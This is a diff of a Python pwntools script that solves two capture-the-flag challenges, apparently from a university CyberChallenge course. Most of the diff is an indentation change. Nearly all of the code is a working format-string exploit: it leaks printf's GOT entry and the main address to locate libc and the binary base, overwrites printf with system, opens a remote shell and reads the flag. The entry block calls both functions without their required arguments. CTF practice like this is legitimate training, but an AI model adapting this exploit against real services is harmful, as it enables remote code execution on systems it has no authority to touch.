@@ -51,118 +51,119 @@ This solution is not the best because it repeatedly runs the binaries until it s
 """
 
 from pwn import *
-import echo_echo20
 
 def echo(binary_file: str, libc_file: str) -> str:
 
-    # Since the library is dynamically linked, .sym will return the offset from the base address
-    libc = ELF(libc_file)
-    printf_offset = libc.sym["printf"]
+	# Since the library is dynamically linked, .sym will return the offset from the base address
+	libc = ELF(libc_file)
+	printf_offset = libc.sym["printf"]
 
-    # This will return the default address in the GOT of the printf function
-    elf = context.binary = ELF(binary_file)
-    printf_got = elf.got["printf"]
+	# This will return the default address in the GOT of the printf function
+	elf = context.binary = ELF(binary_file)
+	printf_got = elf.got["printf"]
 
-    while True:
+	while True:
 
-        r = remote("cyberchallenge.disi.unitn.it", 50230)
+		r = remote("cyberchallenge.disi.unitn.it", 50230)
 
-        # Inject the GOT address in the stack
-        payload = b"A"* 8 + p64(printf_got) #type: ignore
-        r.sendlineafter(b"> ", payload)
+		# Inject the GOT address in the stack
+		payload = b"A" * 8 + p64(printf_got) #type: ignore
+		r.sendlineafter(b"> ", payload)
 
-        # This payload allows us to extract the address pointed to the default address of the printf function
-        payload = b"%7$s"
-        r.sendlineafter(b"> ", payload)
-        printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
-        printf_address = int.from_bytes(printf_address, "little")
+		# This payload allows us to extract the address pointed to the default address of the printf function
+		payload = b"%7$s"
+		r.sendlineafter(b"> ", payload)
+		printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
+		printf_address = int.from_bytes(printf_address, "little")
 
-        # Set the libc address since we know the actual printf address and the offset
-        libc.address = printf_address - printf_offset
+		# Set the libc address since we know the actual printf address and the offset
+		libc.address = printf_address - printf_offset
 
-        # Inject the payload that will replace printf function with system
-        payload = fmtstr_payload(6, {printf_got : libc.sym["system"]}, write_size="short")
-        r.sendlineafter(b"> ", payload)
-        r.sendline(b"/bin/sh")
+		# Inject the payload that will replace printf function with system
+		payload = fmtstr_payload(6, {printf_got: libc.sym["system"]}, write_size="short")
+		r.sendlineafter(b"> ", payload)
+		r.sendline(b"/bin/sh")
 
-        try:
-            r.recvline()
-            r.recvline()
-            r.sendline(b"cat flag.txt")
+		try:
+			r.recvline()
+			r.recvline()
+			r.sendline(b"cat flag.txt")
 
-            flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
-            return flag
+			flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
+			return flag
 
-        except:
-            pass
+		except:
+			pass
 
-        finally:
-            r.close()
+		finally:
+			r.close()
 
-        r.close()
+		r.close()
+
 
 def echo2(binary_file: str, libc_file: str) -> str:
 
-    while True:
+	while True:
 
-        r = remote("cyberchallenge.disi.unitn.it", 50231)
+		r = remote("cyberchallenge.disi.unitn.it", 50231)
 
-        # Since the library is dynamically linked, .sym will return the offset from the base address
-        libc = ELF(libc_file)
-        printf_offset = libc.sym["printf"]
+		# Since the library is dynamically linked, .sym will return the offset from the base address
+		libc = ELF(libc_file)
+		printf_offset = libc.sym["printf"]
 
-        # This will return the default address in the GOT of the printf function
-        elf = context.binary = ELF(binary_file)
+		# This will return the default address in the GOT of the printf function
+		elf = context.binary = ELF(binary_file)
 
-        # Extract the main address
-        r.sendlineafter(b"> ", b"%19$p")
-        main_address = r.recvline()[:-1]
-        main_address = int(main_address, 16)
+		# Extract the main address
+		r.sendlineafter(b"> ", b"%19$p")
+		main_address = r.recvline()[:-1]
+		main_address = int(main_address, 16)
 
-        # Calculate the base address of the binary
-        elf.address = main_address - elf.sym["main"]
+		# Calculate the base address of the binary
+		elf.address = main_address - elf.sym["main"]
 
-        # Extract the GOT address of printf
-        printf_got = elf.got["printf"]
-        
-        # Inject the GOT address in the stack
-        payload = b"A"* 8 + p64(printf_got) #type: ignore
-        r.sendlineafter(b"> ", payload)
+		# Extract the GOT address of printf
+		printf_got = elf.got["printf"]
+		
+		# Inject the GOT address in the stack
+		payload = b"A" * 8 + p64(printf_got) #type: ignore
+		r.sendlineafter(b"> ", payload)
 
-        # This payload allows us to extract the address pointed to the default address of the printf function
-        payload = b"%7$s"
-        r.sendlineafter(b"> ", payload)
-        printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
-        printf_address = int.from_bytes(printf_address, "little")
+		# This payload allows us to extract the address pointed to the default address of the printf function
+		payload = b"%7$s"
+		r.sendlineafter(b"> ", payload)
+		printf_address = r.recvline()[:-1] + b"\x00" + b"\x00"
+		printf_address = int.from_bytes(printf_address, "little")
 
-        # Set the libc address since we know the actual printf address and the offset
-        libc.address = printf_address - printf_offset
+		# Set the libc address since we know the actual printf address and the offset
+		libc.address = printf_address - printf_offset
 
-        # Inject the payload that will replace printf function with system
-        payload = fmtstr_payload(6, {printf_got : libc.sym["system"]}, write_size="short")
-        r.sendlineafter(b"> ", payload)
-        r.sendline(b"/bin/sh")
+		# Inject the payload that will replace printf function with system
+		payload = fmtstr_payload(6, {printf_got: libc.sym["system"]}, write_size="short")
+		r.sendlineafter(b"> ", payload)
+		r.sendline(b"/bin/sh")
 
-        try:
-            r.recvline()
-            r.recvline()
-            r.sendline(b"cat flag.txt")
+		try:
+			r.recvline()
+			r.recvline()
+			r.sendline(b"cat flag.txt")
 
-            flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
-            return flag
+			flag = r.recvline().decode("utf-8", errors="ignore").strip().replace(" ", "")
+			return flag
 
-        except:
-            pass
+		except:
+			pass
 
-        finally:
-            r.close()
+		finally:
+			r.close()
 
-        r.close()
+		r.close()
+
 
 if __name__ == "__main__":
 
-    flag1 = echo()
-    flag2 = echo2()
+	flag1 = echo()
+	flag2 = echo2()
 
-    print(f"echo: {flag1}")
-    print(f"echo 2.0: {flag2}")
+	print(f"echo: {flag1}")
+	print(f"echo 2.0: {flag2}")
